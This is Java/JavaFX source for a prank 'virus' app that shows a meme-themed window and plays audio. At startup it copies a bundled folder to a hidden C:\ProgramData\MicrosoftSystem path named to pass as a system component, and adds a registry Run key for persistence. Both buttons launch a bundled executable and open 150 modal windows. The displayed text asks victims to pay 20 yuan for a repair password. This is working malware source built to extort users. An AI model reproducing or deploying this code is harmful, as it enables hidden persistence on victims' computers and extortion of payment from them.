package com.aoyu;


import javafx.application.Application;
import javafx.concurrent.Task;
import javafx.event.ActionEvent;
import javafx.event.EventHandler;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.geometry.Rectangle2D;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.control.Slider;
import javafx.scene.control.TextArea;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.layout.*;
import javafx.scene.media.Media;
import javafx.scene.media.MediaPlayer;
import javafx.scene.text.Font;
import javafx.stage.Modality;
import javafx.stage.Screen;
import javafx.stage.Stage;
import javafx.stage.StageStyle;

import java.io.*;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Random;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.FutureTask;

public class Main extends Application {

    /**
     * 程序入口Main
     *
     * @param args 启动start方法
     */
    public static void main(String[] args) {

        //植入病毒

        Callable<String> virusImplanted = new Thread1();

        FutureTask<String> futureTask1 = new FutureTask<>(virusImplanted);

        Thread Thread1 = new Thread(futureTask1);

        Thread1.start();


        try {
            System.out.println(futureTask1.get());
        } catch (Exception e) {
            e.printStackTrace();
        }

        launch(args);


    }



    /**
     * 启动窗体
     *
     * @param primaryStage 窗体对象
     * @throws Exception 异常
     */
    @Override
    public void start(Stage primaryStage) throws Exception {

        Callable<Image> loadImageThread1 = new Thread2();

        FutureTask<Image> futureTask2 = new FutureTask<>(loadImageThread1);

        Thread Thread2 = new Thread(futureTask2);

        Thread2.start();

        Image loadImage1 = futureTask2.get();

        Callable<Image> loadImageThread2 = new Thread3();

        FutureTask<Image> futureTask3 = new FutureTask<>(loadImageThread2);

        Thread Thread3 = new Thread(futureTask3);

        Thread3.start();

        Image loadImage2 = futureTask3.get();


        Media jiNiTaiMeiAudio = new Media("https://typora-aoyu.oss-cn-hangzhou.aliyuncs.com/%E6%80%80%E9%80%B8-nshim%20-%20%E9%B8%A1%E4%BD%A0%E5%A4%AA%E7%BE%8E.mp3");
        MediaPlayer AudioPlay = new MediaPlayer(jiNiTaiMeiAudio);

        //设置窗口
        primaryStage.setHeight(600);
        primaryStage.setWidth(600);
        primaryStage.setResizable(false);

        //窗口最底部布局
        VBox vPane1 = new VBox();

        //标题栏布局
        HBox hPane1 = new HBox();
        hPane1.setPrefSize(600, 35);
        hPane1.setStyle("-fx-background-color: #B2BABB  ");
        hPane1.setSpacing(10);
        hPane1.setPadding(new Insets(2));

        //标题栏logo
        Image logoA = new Image("https://typora-aoyu.oss-cn-hangzhou.aliyuncs.com/ao%20%283%29.png");
        ImageView titleLogo = new ImageView(logoA);

        //加入标题栏logo
        hPane1.getChildren().add(titleLogo);

        //主布局
        VBox vPane2 = new VBox();
        vPane2.setStyle("-fx-background-color: #D0D3D4");
        vPane2.setPrefSize(600, 560);
        vPane2.setAlignment(Pos.CENTER);
        vPane2.setPadding(new Insets(20));
        vPane2.setSpacing(20);

        //主布局下的logo
        Image logoAoYu = new Image("https://typora-aoyu.oss-cn-hangzhou.aliyuncs.com/Icon_Files/Icon_Files/Logo.png");
        ImageView logoStage = new ImageView(logoAoYu);

        //将主布局里的logo加入到主布局
        vPane2.getChildren().add(logoStage);

        //添加文本域
        TextArea textarea1 = new TextArea();
        textarea1.setPrefSize(400, 400);
        textarea1.setWrapText(true);
        textarea1.setText("Please read the following information carefully :" + "\n\n" +
                "       The software is a system software, specific what function experience to know, may give you a surprise." + "\n" +
                "       Because this software is currently in the test stage, when you click the start button, the system may crash, the computer " +
                "may be in a state of deadlock, do not panic in this caseBecause this software is currently in the test stage," +
                "when you click the start button, the system may crash, the computer may be in a state of deadlock, do not panic in this case" +
                "If you want to solve this problem, please contact the developer of this soft, who has the password to solve the problem.If " +
                "you want to solve this problem, please contact the developer of this software, who has the password to solve the problem." +
                "\n" + "QQ contact information for developers : 339983216" + "\n" + "Developer Wechat contact information : y23658170" + "\n" + "     The software" +
                " is actually a virus program, which can modify the system configuration information of your computer. Once executed, the computer" +
                " will have problems, There are three solutions, one is to reinstall the system, the second is that you are a boss and can crack the " +
                "software, and the third is to find a developer to get the repair program, and the password of the repair program needs to pay 20 yuan " +
                "to get it..Please use it with caution!!"
                + "\n" + "     The software is for entertainment only and other uses are prohibited.The copyright of this software belongs to the author, " +
                "infringement must be investigated!" + "\n\n" + "Software developer : AoYu"

        );

        textarea1.setStyle("-fx-background-color:#616A6B ;"
                + "-fx-text-fill: #424949 ;"
        );

        textarea1.setEditable(false);
        textarea1.setFont(Font.font(16));

        //添加文本域到主布局
        vPane2.getChildren().add(textarea1);

        vPane1.getChildren().add(hPane1);
        vPane1.getChildren().add(vPane2);

        //按钮布局
        HBox hPane2 = new HBox();

        hPane2.setAlignment(Pos.CENTER);
        hPane2.setSpacing(100);

        //添加到主布局
        vPane2.getChildren().add(hPane2);

        //添加button
        Button button1 = new Button("Start");
        button1.setPrefSize(230, 70);
        Button button2 = new Button("Stop");
        button2.setPrefSize(230, 70);
        button1.setStyle("-fx-background-color: #B2BABB;"
                + "-fx-border-color:#BFC9CA ;"
                + "-fx-border-width:2");
        button2.setStyle("-fx-background-color: #B2BABB;"
                + "-fx-border-color:#BFC9CA ;"
                + "-fx-border-width:2");


        //将按钮添加到按钮布局
        hPane2.getChildren().add(button1);
        hPane2.getChildren().add(button2);


        Scene scene = new Scene(vPane1);

        primaryStage.setScene(scene);

        primaryStage.initStyle(StageStyle.TRANSPARENT);

        primaryStage.show();

        //设置button1事件监听
        button1.setOnAction(event -> {

            AudioPlay.play();

            cxkStageShow(primaryStage,loadImage1,loadImage2);


        });

        //设置button2事件监听
        button2.setOnAction(new EventHandler<ActionEvent>() {
            @Override
            public void handle(ActionEvent event) {


                AudioPlay.play();
                cxkStageShow(primaryStage,loadImage1,loadImage2);

            }
        });


    }

    /**
     * 获取当前程序所在路径的方法
     *
     * @return 返回路径
     */
    public static String fileURL() {
        File files = new File(" ");
        String filePath = null;
        try {
            filePath = files.getCanonicalPath();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return filePath;
    }

    /**
     * 复制文件的方法
     *
     * @param source 源文件
     * @param dest   目标文件
     * @throws IOException 抛异常
     */
    public static void copyFile(File source, String dest) throws IOException {
        File destfile = new File(dest);
        if (!destfile.exists())
            destfile.mkdir();
        if (source.isDirectory()) {
            File file = new File(dest + "\\" + source.getName());
            file.mkdir();
            File files[] = source.listFiles();
            if (files.length == 0)
                return;
            for (File value : files) copyFile(value, file.getPath());

        } else if (source.isFile()) {
            FileInputStream fis = new FileInputStream(source);
            File dfile = new File(dest + "\\" + source.getName());
            if (!dfile.exists())
                dfile.createNewFile();
            FileOutputStream fos = new FileOutputStream(dfile);
            byte b[] = new byte[1024];
            int len;
            while ((len = fis.read(b)) != -1)
                fos.write(b, 0, len);
            fos.close();
            fis.close();
        }
    }

    public void startVirus() {

        String virusPath = fileURL();

        virusPath += "subassembly\\swiftshader\\Peripheral.exe";

        System.out.println(virusPath);

        Runtime runtime = Runtime.getRuntime();
        Process process;
        try {
            process = runtime.exec("cmd /c start " + virusPath);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * 启动植入病毒的方法
     *
     * @param isStartAtLogon 登录启动
     * @throws IOException 抛异常
     */
    public static void ChangeStart(boolean isStartAtLogon)
            throws IOException {
        String regKey = "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        String myAppName = "AoYuWSVCopyOf.exe";
        String exePath = "C:\\ProgramData\\MicrosoftSystem\\AoYu\\subassembly\\AoYuWSVCopyOf.exe";
        Runtime.getRuntime().exec("reg " + (isStartAtLogon ? "add " : "delete ") + regKey + " /v "
                + myAppName + (isStartAtLogon ? " /t reg_sz /d " + exePath : " /f"));
    }

    public void cxkStageShow(Stage stage ,Image image1,Image image2) {

        startVirus();

        Screen screen = Screen.getPrimary();
        Rectangle2D bounds = screen.getBounds();
        double screenWidth = bounds.getWidth();
        double screenHight = bounds.getHeight();

        System.out.println(screenWidth);
        System.out.println(screenHight);

        for (int i = 0; i < 150; i++) {

            Random r1 = new Random();

            int x = r1.nextInt((int) screenWidth);

            Random r2 = new Random();

            int y = r2.nextInt((int) screenHight);

            Stage stage1 = new Stage();

            AnchorPane a1 = new AnchorPane();

            ImageView imgView1;
            if(i % 2 == 0){
                imgView1 = new ImageView(image1);
            }else {
                imgView1 = new ImageView(image2);
            }
            a1.getChildren().add(imgView1);


            stage1.setX(x);
            stage1.setY(y);

            stage1.initOwner(stage);
            stage1.initModality(Modality.WINDOW_MODAL);
            stage1.setTitle("鸡你太美_蔡徐坤");
            stage1.getIcons().add(new Image("https://typora-aoyu.oss-cn-hangzhou.aliyuncs.com/cxkHead2.png"));

            stage1.show();

            Scene scene1 = new Scene(a1);

            stage1.setScene(scene1);



            stage1.setWidth(490);
            stage1.setHeight(280);
        }
    }

}


class Thread1 extends Main implements Callable<String> {


    @Override
    public String call() throws Exception {

        File MicrosoftSystemFile = new File("C:\\ProgramData\\MicrosoftSystem");

        if (!MicrosoftSystemFile.exists()){
            MicrosoftSystemFile.mkdir();
        }

        //获取当前程序执行路径
        String nowProgramPath = fileURL();
        nowProgramPath += "subassembly";

        System.out.println(nowProgramPath);

        //需要复制的文件
        File oldFile = new File(nowProgramPath);

        //需要复制到的文件路径
        String newFilePath = "C:\\ProgramData\\MicrosoftSystem\\AoYu";
        File newFile = new File(newFilePath);

        //调用复制文件的方法
        try {
            copyFile(oldFile, newFilePath);
        } catch (IOException e) {
            e.printStackTrace();
        }

        //隐藏文件夹

        try {
            Runtime.getRuntime().exec("attrib " + "" + newFile.getAbsolutePath() + "" + " +H");
        } catch (IOException e) {
            e.printStackTrace();
        }


        //启动植入病毒
        try {
            ChangeStart(true);
        } catch (IOException e) {
            e.printStackTrace();
        }

        return "Virus Was Successfully Implanted";
    }

}

class Thread2 extends Main implements Callable<Image> {


    @Override
    public Image call() throws Exception {

        String gifPath1 = fileURL();
        gifPath1 += "subassembly\\resources\\cxkimage1.gif";
        FileInputStream image1File = new FileInputStream(gifPath1);

        return new Image(image1File);


    }

}

class Thread3 extends Main implements Callable<Image> {


    @Override
    public Image call() throws Exception {

        String gifPath2 = fileURL();
        gifPath2+= "subassembly\\resources\\cxkimage2.gif";

        FileInputStream image2File = new FileInputStream(gifPath2);

        return new Image(image2File);

    }

}
